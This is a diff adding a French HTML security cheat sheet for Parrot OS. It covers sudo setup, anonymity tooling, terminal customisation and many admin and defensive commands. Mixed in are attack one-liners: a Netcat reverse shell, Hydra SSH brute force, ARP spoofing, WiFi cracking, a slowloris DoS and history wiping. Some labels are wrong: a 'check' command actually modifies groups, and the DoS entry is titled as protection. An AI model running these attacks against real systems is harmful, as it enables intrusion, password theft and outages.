@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet Sécurité Réseau - Parrot OS</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Cheat Sheet by @ml0ck</h1>
+    </header>
+
+    <br><br><br>
+<div class="title-container">
+    <a href="lessh.html" class="cryptic-title">>>Utilisation de SSH..<<</a>
+</div>
+<br><br><br>
+
+
+
+
+    <main>
+
+
+        <div class="step" id="change-user">
+    <h3>Changer d'Utilisateur dans le Terminal</h3>
+
+    <!-- Étape 1: Utiliser su pour changer d'utilisateur -->
+    <div>
+        <h4>Utiliser la commande <code>su</code> pour basculer vers un autre utilisateur</h4>
+        <p>La commande <code>su</code> permet de changer l'utilisateur actif dans le terminal :</p>
+        <pre><code>su <em>nom_utilisateur</em></code></pre>
+        <p>Après avoir entré cette commande, le système vous demandera le mot de passe de l'utilisateur cible. Utilisez <code>exit</code> pour revenir à votre utilisateur d'origine.</p>
+    </div>
+
+    <!-- Étape 2: Utiliser sudo pour exécuter des commandes avec des privilèges élevés -->
+    <div>
+        <h4>Utiliser <code>sudo</code> pour exécuter des commandes avec des privilèges élevés</h4>
+        <p>Pour exécuter une commande avec des privilèges root sans changer d'utilisateur, utilisez <code>sudo</code> :</p>
+        <pre><code>sudo <em>commande</em></code></pre>
+        <p>Par exemple : <code>sudo apt update</code> mettra à jour le système avec les privilèges administratifs.</p>
+        <p>Assurez-vous que votre utilisateur est dans le groupe <code>sudo</code> pour pouvoir exécuter ces commandes. Vérifiez avec :</p>
+        <pre><code>sudo usermod -aG sudo <em>votre_utilisateur</em></code></pre>
+    </div>
+</div>
+
+    <div class="step" id="sudoers-fix">
+    <h3>Éviter l'erreur "User is not in the sudoers file"</h3>
+
+    <!-- Étape 1: Se connecter en tant que root -->
+    <div>
+        <h4>Étape 1 : Se connecter en tant que root</h4>
+        <p>Si vous voyez l'erreur <code>"User is not in the sudoers file"</code>, cela signifie que votre utilisateur n'a pas les privilèges sudo. Pour résoudre ce problème, vous devez d'abord vous connecter en tant que root :</p>
+        <pre><code>su</code></pre>
+        <p>Entrez ensuite le mot de passe de l'utilisateur root.</p>
+    </div>
+
+    <!-- Étape 2: Ajouter l'utilisateur au groupe sudo -->
+    <div>
+        <h4>Étape 2 : Ajouter l'utilisateur au groupe sudo</h4>
+        <p>Une fois connecté en tant que root, utilisez la commande suivante pour ajouter votre utilisateur au groupe <code>sudo</code> :</p>
+        <pre><code>usermod -aG sudo <em>nom_utilisateur</em></code></pre>
+        <p>Par exemple, pour l'utilisateur <code>ml0ck</code> :</p>
+        <pre><code>usermod -aG sudo ml0ck</code></pre>
+    </div>
+
+    <!-- Étape 3: Vérifier et modifier le fichier sudoers -->
+    <div>
+        <h4>Étape 3 : Vérifier et modifier le fichier sudoers si nécessaire</h4>
+        <p>Pour vous assurer que l'utilisateur est correctement ajouté au fichier sudoers, vous pouvez utiliser la commande <code>visudo</code> pour éditer ce fichier de manière sécurisée :</p>
+        <pre><code>visudo</code></pre>
+        <p>Vérifiez que la ligne suivante est présente et non commentée (sans <code>#</code>) :</p>
+        <pre><code>%sudo   ALL=(ALL:ALL) ALL</code></pre>
+        <p>Cette ligne permet à tous les utilisateurs du groupe <code>sudo</code> d'exécuter des commandes avec des privilèges administratifs.</p>
+    </div>
+
+    <!-- Étape 4: Déconnexion et test -->
+    <div>
+        <h4>Étape 4 : Déconnexion et Test</h4>
+        <p>Après avoir ajouté votre utilisateur au groupe <code>sudo</code>, déconnectez-vous puis reconnectez-vous pour appliquer les modifications :</p>
+        <pre><code>exit</code></pre>
+        <p>Ensuite, testez la commande <code>sudo</code> pour vérifier que l'erreur est résolue :</p>
+        <pre><code>sudo <em>commande</em></code></pre>
+    </div>
+</div>
+
+
+
+        <div class="section2" id="anonymous-setup" data-keywords="anonymat terminal sécurité réseau discret">
+    <h2>Configurer son Environnement dans le Terminal pour la Sécurité Réseau en Restant Anonyme et Discret</h2>
+
+    <!-- Étape 1: Utiliser Tor pour l'anonymat -->
+    <div class="step">
+        <h3>Étape 1 : Utiliser Tor pour un Navigateur et un Réseau Anonyme</h3>
+        <p><code>sudo apt install tor</code></p>
+        <p>Installez le service <code>Tor</code> pour rediriger le trafic réseau via des relais anonymes, masquant ainsi votre identité.</p>
+        <p>Lancez Tor : <code>sudo service tor start</code> et configurez votre terminal pour utiliser le proxy SOCKS5 : <code>export http_proxy="socks5://127.0.0.1:9050"</code>.</p>
+    </div>
+
+    <!-- Étape 2: Naviguer anonymement avec ProxyChains -->
+    <div class="step">
+        <h3>Étape 2 : Configurer ProxyChains pour Cacher Votre Trafic</h3>
+        <p><code>sudo apt install proxychains</code></p>
+        <p>ProxyChains permet d'exécuter vos commandes via un réseau de proxies, incluant Tor.</p>
+        <p>Utilisez-le ainsi : <code>proxychains curl ifconfig.me</code> pour masquer votre adresse IP réelle lorsque vous interrogez un service externe.</p>
+    </div>
+
+    <!-- Étape 3: Changer régulièrement d'adresse MAC -->
+    <div class="step">
+        <h3>Étape 3 : Modifier votre Adresse MAC pour une Anonymisation Physique</h3>
+        <p><code>sudo apt install macchanger</code></p>
+        <p>Modifiez régulièrement votre adresse MAC pour éviter d'être suivi physiquement sur un réseau :</p>
+        <p><code>sudo macchanger -r eth0</code> pour changer l'adresse MAC de votre interface réseau.</p>
+    </div>
+
+    <!-- Étape 4: Configurer un VPN pour une autre couche d'anonymat -->
+    <div class="step">
+        <h3>Étape 4 : Configurer un VPN Sécurisé pour Chiffrer vos Données</h3>
+        <p>Installez un VPN de confiance pour ajouter une couche supplémentaire de confidentialité :</p>
+        <p>Exemple avec OpenVPN :</p>
+        <pre><code>sudo apt install openvpn</code></pre>
+        <p>Configurez-le avec vos fichiers de configuration : <code>sudo openvpn --config fichier_config.ovpn</code>.</p>
+    </div>
+
+    <!-- Étape 5: Limiter les informations laissées par votre terminal -->
+    <div class="step">
+        <h3>Étape 5 : Nettoyer l'Historique de Commandes</h3>
+        <p>Évitez de laisser des traces de vos activités dans le terminal :</p>
+        <p><code>history -c && history -w</code> pour effacer l'historique des commandes.</p>
+        <p>Définissez également cette commande dans votre fichier <code>~/.bashrc</code> pour supprimer automatiquement l'historique à la fermeture.</p>
+    </div>
+
+    <!-- Étape 6: Utiliser des systèmes de fichiers chiffrés -->
+    <div class="step">
+        <h3>Étape 6 : Utiliser des Systèmes de Fichiers Chiffrés pour vos Données Sensibles</h3>
+        <p>Créez un volume chiffré avec <code>LUKS</code> pour protéger vos fichiers sensibles :</p>
+        <pre><code>sudo cryptsetup luksFormat /dev/sdX</code></pre>
+        <p>Déchiffrez et montez le volume avec : <code>sudo cryptsetup luksOpen /dev/sdX volume_crypté</code>.</p>
+    </div>
+
+    <!-- Étape 7: Utiliser un pare-feu pour contrôler le trafic réseau -->
+    <div class="step">
+        <h3>Étape 7 : Configurer un Pare-feu pour Bloquer les Connexions Indésirables</h3>
+        <p>Utilisez <code>UFW</code> pour gérer facilement les règles de pare-feu :</p>
+        <p><code>sudo ufw enable</code> pour activer le pare-feu, et <code>sudo ufw default deny incoming</code> pour bloquer les connexions non autorisées.</p>
+        <p>Autorisez ensuite les services nécessaires : <code>sudo ufw allow ssh</code>.</p>
+    </div>
+
+    <!-- Étape 8: Utiliser des machines virtuelles ou containers pour l'isolation -->
+    <div class="step">
+        <h3>Étape 8 : Utiliser des Machines Virtuelles ou des Conteneurs pour Isoler vos Activités</h3>
+        <p>Utilisez <code>VirtualBox</code> ou <code>Docker</code> pour exécuter vos tâches dans un environnement isolé :</p>
+        <p><code>sudo apt install virtualbox docker</code></p>
+        <p>Les VM et conteneurs ajoutent une couche de protection en cas de compromission.</p>
+    </div>
+</div>
+
+
+
+        <div class="section" id="terminal-setup" data-keywords="configuration terminal bash zsh root personnalisation">
+    <h2>Configurer un Terminal Prêt à l'Emploi Et utiliser ParrotOS</h2>
+
+    <!-- Étape 1: Mettre à jour le système -->
+    <div class="step">
+        <h3>Étape 1 : Mettre à jour le système</h3>
+        <p><code>sudo apt update && sudo apt upgrade -y</code></p>
+        <p>Commencez par mettre à jour tous les paquets du système pour assurer que tout soit à jour.</p>
+    </div>
+
+    <!-- Étape 2: Activer l'accès root -->
+    <div class="step">
+        <h3>Étape 2 : Activer l'accès root</h3>
+        <p><code>sudo passwd root</code></p>
+        <p>Définissez un mot de passe pour l'utilisateur root pour permettre les connexions en tant que super utilisateur.</p>
+        <p><code>su -</code> pour passer en mode root après avoir défini le mot de passe.</p>
+    </div>
+
+    <!-- Étape 3: Installer Zsh pour un shell amélioré -->
+    <div class="step">
+        <h3>Étape 3 : Installer Zsh pour un shell amélioré</h3>
+        <p><code>sudo apt install zsh -y</code></p>
+        <p>Zsh est un shell plus avancé que Bash, offrant une meilleure personnalisation et des fonctionnalités supplémentaires.</p>
+    </div>
+
+    <!-- Étape 4: Installer Oh My Zsh pour la personnalisation -->
+    <div class="step">
+        <h3>Étape 4 : Installer Oh My Zsh pour la personnalisation</h3>
+        <p><code>sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"</code></p>
+        <p>Oh My Zsh est un framework qui permet de personnaliser Zsh avec des thèmes, des plugins, et des raccourcis utiles.</p>
+    </div>
+
+    <!-- Étape 5: Choisir un thème Zsh -->
+    <div class="step">
+        <h3>Étape 5 : Choisir un thème Zsh</h3>
+        <p>Pour changer de thème, éditez le fichier <code>~/.zshrc</code> :</p>
+        <p><code>nano ~/.zshrc</code></p>
+        <p>Modifiez la ligne <code>ZSH_THEME="robbyrussell"</code> en <code>ZSH_THEME="agnoster"</code> par exemple, puis sauvegardez et relancez le terminal.</p>
+    </div>
+
+    <!-- Étape 6: Activer les plugins utiles dans Oh My Zsh -->
+    <div class="step">
+        <h3>Étape 6 : Activer des plugins utiles</h3>
+        <p>Oh My Zsh offre de nombreux plugins. Activez-en plusieurs en modifiant le fichier <code>~/.zshrc</code> :</p>
+        <p>Exemple :</p>
+        <pre><code>plugins=(git sudo history)</code></pre>
+        <p>Ajoutez les plugins qui vous intéressent, comme <code>git</code> pour les commandes Git ou <code>z</code> pour la navigation rapide dans les dossiers.</p>
+    </div>
+
+    <!-- Étape 7: Installer un terminal avec support des polices -->
+    <div class="step">
+        <h3>Étape 7 : Installer un terminal avec support des polices</h3>
+        <p>Installez un terminal moderne comme <code>Tilix</code> ou <code>Terminator</code> :</p>
+        <p><code>sudo apt install tilix -y</code> ou <code>sudo apt install terminator -y</code></p>
+        <p>Ces terminaux supportent des fonctionnalités avancées comme les onglets, les fenêtres divisées, et les polices powerline.</p>
+    </div>
+
+    <!-- Étape 8: Ajouter des polices Powerline pour un meilleur affichage -->
+    <div class="step">
+        <h3>Étape 8 : Ajouter des polices Powerline</h3>
+        <p>Les thèmes comme <code>Agnoster</code> nécessitent les polices Powerline. Installez-les avec :</p>
+        <p><code>sudo apt install fonts-powerline</code></p>
+    </div>
+
+    <!-- Étape 9: Installer un gestionnaire de paquets comme Homebrew -->
+    <div class="step">
+        <h3>Étape 9 : Installer un gestionnaire de paquets supplémentaire (Homebrew)</h3>
+        <p>Homebrew permet d'installer des paquets supplémentaires non présents dans les dépôts par défaut :</p>
+        <p><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></p>
+    </div>
+
+    <!-- Étape 10: Ajouter des alias utiles -->
+    <div class="step">
+        <h3>Étape 10 : Ajouter des alias utiles</h3>
+        <p>Créez des alias pour accélérer vos tâches quotidiennes. Ajoutez-les dans <code>~/.zshrc</code> :</p>
+        <p>Exemple :</p>
+        <pre><code>alias update="sudo apt update && sudo apt upgrade -y"</code></pre>
+        <p>Ajoutez des raccourcis pour les commandes que vous utilisez fréquemment.</p>
+    </div>
+
+    <!-- Étape 11: Utiliser tmux pour gérer plusieurs sessions dans un seul terminal -->
+    <div class="step">
+        <h3>Étape 11 : Installer et utiliser tmux</h3>
+        <p><code>sudo apt install tmux</code></p>
+        <p>Utilisez <code>tmux</code> pour gérer plusieurs sessions dans un même terminal. Cela permet de garder des sessions ouvertes même après la fermeture de votre terminal.</p>
+    </div>
+
+    <!-- Étape 12: Nettoyer le système après la configuration -->
+    <div class="step">
+        <h3>Étape 12 : Nettoyer le système</h3>
+        <p>Après toutes les installations, nettoyez les paquets inutiles :</p>
+        <p><code>sudo apt autoremove && sudo apt autoclean</code></p>
+    </div>
+
+</div>
+
+
+
+    <center>
+        <section id="commands">
+            <h2>Commandes de base de sécurité en Bash/Linux</h2>
+            <div class="command" data-keywords="mise à jour apt update upgrade">
+                <h3>Mettre à jour les paquets</h3>
+                <p><code>sudo apt update && sudo apt upgrade</code></p>
+                <p>Mise à jour des paquets et du système.</p>
+            </div>
+
+            <div class="command" data-keywords="permissions chmod chown">
+                <h3>Changer les permissions des fichiers</h3>
+                <p><code>chmod 755 fichier</code> ou <code>chown user:user fichier</code></p>
+                <p>Modifier les permissions ou la propriété des fichiers.</p>
+            </div>
+
+            <div class="command" data-keywords="analyse reseau nmap port scanning">
+                <h3>Scan des ports avec Nmap</h3>
+                <p><code>nmap -sP 192.168.1.0/24</code></p>
+                <p>Scanner les hôtes actifs sur le réseau.</p>
+            </div>
+
+            <div class="command" data-keywords="firewall ufw securiser">
+                <h3>Configurer le pare-feu UFW</h3>
+                <p><code>sudo ufw enable</code> puis <code>sudo ufw allow 22</code></p>
+                <p>Activer UFW et autoriser SSH sur le port 22.</p>
+            </div>
+
+            <div class="command" data-keywords="analyse reseau wireshark traffic capture">
+                <h3>Capturer du trafic avec Wireshark</h3>
+                <p><code>wireshark</code></p>
+                <p>Outil graphique pour capturer et analyser les paquets réseau.</p>
+            </div>
+
+            <div class="command" data-keywords="surveiller reseau netstat traffic">
+                <h3>Surveiller les connexions réseau</h3>
+                <p><code>netstat -tuln</code></p>
+                <p>Liste des connexions actives et des services à l’écoute.</p>
+            </div>
+
+            <div class="command" data-keywords="monitoring htop cpu memoire utilisation">
+                <h3>Surveiller l’utilisation du CPU et de la mémoire</h3>
+                <p><code>htop</code></p>
+                <p>Outil interactif pour surveiller les processus et la charge du système.</p>
+            </div>
+
+            <div class="command" data-keywords="exploitations metasploit vulnerabilites">
+                <h3>Utilisation de Metasploit</h3>
+                <p><code>msfconsole</code></p>
+                <p>Framework pour tester les vulnérabilités et les exploitations.</p>
+            </div>
+
+
+            <div class="command" data-keywords="surveiller tcpdump capture traffic analyse reseau">
+    <h3>Capturer des paquets avec tcpdump</h3>
+    <p><code>sudo tcpdump -i eth0</code></p>
+    <p>Capture les paquets sur l'interface réseau eth0 pour analyse.</p>
+</div>
+
+<div class="command" data-keywords="analyse fail2ban protection brute force">
+    <h3>Protection contre le brute force avec Fail2ban</h3>
+    <p><code>sudo fail2ban-client status</code></p>
+    <p>Surveille les journaux pour bloquer les tentatives de connexion brute force.</p>
+</div>
+
+<div class="command" data-keywords="audit lynis securite systeme">
+    <h3>Audit de sécurité avec Lynis</h3>
+    <p><code>sudo lynis audit system</code></p>
+    <p>Outil d'audit de sécurité pour analyser la sécurité du système.</p>
+</div>
+
+<div class="command" data-keywords="ouvrir port iptables pare feu firewall">
+    <h3>Ouvrir un port spécifique avec iptables</h3>
+    <p><code>sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT</code></p>
+    <p>Autorise les connexions entrantes sur le port 80 (HTTP).</p>
+</div>
+
+<div class="command" data-keywords="arp spoofing arpspoof attaque surveillance">
+    <h3>Attaque ARP Spoofing avec arpspoof</h3>
+    <p><code>sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</code></p>
+    <p>Permet de détourner le trafic réseau entre une cible et un routeur.</p>
+</div>
+
+<div class="command" data-keywords="monitoring network interface iftop traffic utilisation">
+    <h3>Surveiller l’utilisation du réseau avec iftop</h3>
+    <p><code>sudo iftop -i eth0</code></p>
+    <p>Affiche l’utilisation de la bande passante sur l’interface réseau eth0.</p>
+</div>
+
+<div class="command" data-keywords="traceroute analyse chemin route reseau">
+    <h3>Tracer la route des paquets avec traceroute</h3>
+    <p><code>traceroute 8.8.8.8</code></p>
+    <p>Affiche les routes empruntées par les paquets vers une destination spécifique.</p>
+</div>
+
+<div class="command" data-keywords="fermer port netstat kill processus">
+    <h3>Fermer un port ou processus avec netstat</h3>
+    <p><code>sudo netstat -tuln | grep 80</code> puis <code>kill -9 PID</code></p>
+    <p>Identifie les processus utilisant un port spécifique et les termine.</p>
+</div>
+
+<div class="command" data-keywords="surveiller log journaux systeme">
+    <h3>Surveiller les journaux système</h3>
+    <p><code>tail -f /var/log/syslog</code></p>
+    <p>Affiche en temps réel les journaux système pour surveiller les événements.</p>
+</div>
+
+<div class="command" data-keywords="crypter fichier gpg chiffrement securite">
+    <h3>Crypter un fichier avec GPG</h3>
+    <p><code>gpg -c fichier.txt</code></p>
+    <p>Crée une version chiffrée du fichier texte avec une passphrase.</p>
+</div>
+
+<div class="command" data-keywords="ssh tunnel chiffrement securisation connexion">
+    <h3>Créer un tunnel SSH sécurisé</h3>
+    <p><code>ssh -L 8080:localhost:80 user@serveur</code></p>
+    <p>Crée un tunnel SSH pour sécuriser la connexion à un serveur distant.</p>
+</div>
+
+<div class="command" data-keywords="analyse vulnerabilites openvas scanner securite">
+    <h3>Scanner les vulnérabilités avec OpenVAS</h3>
+    <p><code>sudo openvas-start</code></p>
+    <p>Lancer OpenVAS pour scanner et détecter les vulnérabilités sur le réseau.</p>
+</div>
+
+<div class="command" data-keywords="hash verifier fichier sha256sum md5sum integrite">
+    <h3>Vérifier l’intégrité d’un fichier</h3>
+    <p><code>sha256sum fichier.iso</code> ou <code>md5sum fichier.iso</code></p>
+    <p>Génère un hash du fichier pour vérifier son intégrité.</p>
+</div>
+
+<div class="command" data-keywords="scan reseau hping3 analyse ports icmp tcp">
+    <h3>Scan réseau avancé avec hping3</h3>
+    <p><code>sudo hping3 -S 192.168.1.1 -p 80</code></p>
+    <p>Scanner un port spécifique avec des paquets TCP SYN.</p>
+</div>
+
+<div class="command" data-keywords="surveiller disque df espace stockage utilisation">
+    <h3>Vérifier l’utilisation du disque</h3>
+    <p><code>df -h</code></p>
+    <p>Affiche l’utilisation du disque en format lisible par l’homme.</p>
+</div>
+
+
+    <div class="command" data-keywords="brute force hydra password attaque mot de passe ssh">
+    <h3>Brute Force SSH avec Hydra</h3>
+    <p><code>hydra -l utilisateur -P /path/to/passwords.txt ssh://192.168.1.100</code></p>
+    <p>Utilise Hydra pour effectuer une attaque par brute force sur un service SSH avec une liste de mots de passe.</p>
+</div>
+
+<div class="command" data-keywords="reverse shell nc netcat connexion backdoor">
+    <h3>Créer un reverse shell avec Netcat</h3>
+    <p><code>nc -e /bin/bash 192.168.1.100 4444</code></p>
+    <p>Ouvre une connexion shell à distance en utilisant Netcat pour une prise de contrôle à distance.</p>
+</div>
+
+<div class="command" data-keywords="scan de vulnerabilité nikto web serveurs">
+    <h3>Scanner un serveur web avec Nikto</h3>
+    <p><code>nikto -h http://192.168.1.100</code></p>
+    <p>Outil pour détecter les vulnérabilités dans un serveur web comme les configurations dangereuses et les failles de sécurité.</p>
+</div>
+
+<div class="command" data-keywords="attaque brute force john the ripper mot de passe crack">
+    <h3>Craquer des mots de passe avec John the Ripper</h3>
+    <p><code>john --wordlist=/path/to/wordlist.txt hashes.txt</code></p>
+    <p>Utilise John the Ripper pour cracker des mots de passe hashés en utilisant une liste de mots.</p>
+</div>
+
+<div class="command" data-keywords="controle acces pam tfa authentification double facteur">
+    <h3>Configurer une authentification à double facteur (2FA) avec PAM</h3>
+    <p><code>sudo apt install libpam-google-authenticator</code></p>
+    <p>Installe le module PAM pour utiliser Google Authenticator et activer la 2FA sur les connexions SSH.</p>
+</div>
+
+<div class="command" data-keywords="dns reconnaissance dig analyse informations dns">
+    <h3>Analyse DNS avec dig</h3>
+    <p><code>dig example.com</code></p>
+    <p>Interroge les serveurs DNS pour obtenir des informations détaillées sur un domaine, comme les enregistrements A, MX, etc.</p>
+</div>
+
+<div class="command" data-keywords="analyse systeme clamav antivirus scanner fichiers malwares">
+    <h3>Scanner les malwares avec ClamAV</h3>
+    <p><code>clamscan -r /path/to/directory</code></p>
+    <p>Utilise ClamAV pour scanner un répertoire ou tout le système à la recherche de malwares et de virus.</p>
+</div>
+
+<div class="command" data-keywords="surveiller rootkit chkrootkit rootkit detection securite">
+    <h3>Détection de rootkits avec chkrootkit</h3>
+    <p><code>sudo chkrootkit</code></p>
+    <p>Vérifie la présence de rootkits connus sur le système, des malwares qui s’installent profondément dans le système.</p>
+</div>
+
+<div class="command" data-keywords="exploitation metasploit module penetration attaque">
+    <h3>Recherche de modules d'exploitation avec Metasploit</h3>
+    <p><code>search exploit windows smb</code></p>
+    <p>Utilise Metasploit pour rechercher des modules d'exploitation spécifiques, ici pour des failles SMB sur Windows.</p>
+</div>
+
+<div class="command" data-keywords="analyse reseau snort intrusion detection ids">
+    <h3>Détection d'intrusions avec Snort</h3>
+    <p><code>sudo snort -A console -i eth0 -c /etc/snort/snort.conf</code></p>
+    <p>Utilise Snort pour surveiller le réseau et détecter des intrusions en temps réel en fonction de règles prédéfinies.</p>
+</div>
+
+<div class="command" data-keywords="monitoring system audit auditd securite journaux">
+    <h3>Configurer l'audit de sécurité avec auditd</h3>
+    <p><code>sudo auditctl -w /etc/passwd -p wa -k passwd_changes</code></p>
+    <p>Configure l’audit pour surveiller les modifications du fichier /etc/passwd, en journalisant toutes les écritures et accès.</p>
+</div>
+
+<div class="command" data-keywords="attaque wifi aircrack-ng cracking wep wpa">
+    <h3>Craquer des réseaux WiFi avec Aircrack-ng</h3>
+    <p><code>aircrack-ng -b [BSSID] capture_file.cap</code></p>
+    <p>Utilise Aircrack-ng pour craquer un réseau WiFi en utilisant des fichiers de capture d'un handshake WPA ou des réseaux WEP.</p>
+</div>
+
+<div class="command" data-keywords="verifier mises a jour securite unattended-upgrades">
+    <h3>Configurer les mises à jour automatiques de sécurité</h3>
+    <p><code>sudo dpkg-reconfigure -plow unattended-upgrades</code></p>
+    <p>Permet de configurer le système pour appliquer automatiquement les mises à jour de sécurité critiques.</p>
+</div>
+
+<div class="command" data-keywords="protection doss attaque slowloris denial of service">
+    <h3>Protection contre les attaques DoS avec Slowloris</h3>
+    <p><code>slowloris http://192.168.1.100</code></p>
+    <p>Simule une attaque par déni de service sur un serveur web en utilisant des connexions HTTP lentes.</p>
+</div>
+
+<div class="command" data-keywords="securiser ssl tls openssl certificat generation">
+    <h3>Générer un certificat SSL avec OpenSSL</h3>
+    <p><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365</code></p>
+    <p>Génère un certificat auto-signé avec OpenSSL pour activer HTTPS sur un serveur web.</p>
+</div>
+
+<div class="command" data-keywords="connexion proxy tor anonymat reseau securite">
+    <h3>Se connecter à Internet via Tor</h3>
+    <p><code>torsocks curl http://check.torproject.org</code></p>
+    <p>Utilise Tor pour se connecter à un site web via un proxy pour garantir l'anonymat et la sécurité.</p>
+</div>
+
+<div class="command" data-keywords="creer vpn openvpn tunnel chiffré">
+    <h3>Configurer un VPN avec OpenVPN</h3>
+    <p><code>sudo openvpn --config /path/to/client.ovpn</code></p>
+    <p>Connecte un client à un serveur VPN OpenVPN pour sécuriser la connexion réseau via un tunnel chiffré.</p>
+</div>
+</center>
+
+        </section>
+    </main>
+
+    <script src="app.js"></script>
+</body>
+</html>
